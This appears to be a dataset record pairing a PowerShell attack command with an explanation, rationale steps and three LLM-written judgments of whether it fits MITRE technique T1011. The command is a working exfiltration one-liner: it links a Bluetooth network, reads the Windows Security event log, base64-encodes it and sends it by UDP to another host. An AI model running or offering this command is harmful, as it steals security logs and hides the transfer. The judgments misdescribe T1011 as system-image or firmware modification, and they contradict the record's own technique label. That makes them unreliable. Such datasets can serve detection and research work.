command: & 'C:\Tools\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name="$if" static 172.25.83.6 255.255.255.252 | Out-Null; $payload=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Windows\System32\winevt\Logs\Security.evtx')); $udp=New-Object Net.Sockets.UdpClient; $udp.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.25.83.6'),0)); $bytes=[Text.Encoding]::UTF8.GetBytes($payload); $udp.Send($bytes,$bytes.Length,'172.25.83.5',53127) | Out-Null; $udp.Close()
explanation: Creates a Bluetooth PAN path and exfiltrates base64-encoded event log data via UDP to a nonstandard port over the Bluetooth interface (T1011).
rationale_steps: Connect to Bluetooth NAP to establish the alternate medium.
Configure the Bluetooth IP using netsh, avoiding common interfaces.
Bind a UDP socket to the Bluetooth IP to ensure the medium is Bluetooth.
Send base64 data to a high-numbered, uncommon UDP port.

llm_judgments.syntactic_justification: The command is perfectly well-formed with proper PowerShell syntax including balanced quotes, parentheses, and braces, correct command separators, valid flag formats, and proper variable assignments.
llm_judgments.semantic_justification: While the command does exfiltrate data over Bluetooth as claimed, it doesn't actually modify system images or firmware as described in T1011 (Exfiltration Over Other Network Medium), making it misaligned with the MITRE technique description provided.

llm_judgments.syntactic_justification: The command is perfectly well-formed with correct Powershell syntax, balanced elements, and valid operators throughout.
llm_judgments.semantic_justification: The command performs data exfiltration over Bluetooth, which is entirely unrelated to modifying system images; therefore, it does not achieve the claimed intent of MITRE ATT&CK technique T1011 (Modify System Image).

llm_judgments.syntactic_justification: Well-formed PowerShell with balanced quoting/parentheses, valid separators, and plausible cmdlets/arguments throughout.
llm_judgments.semantic_justification: It establishes a Bluetooth PAN and exfiltrates data via UDP, which is unrelated to modifying a system image/firmware as described for the stated technique.
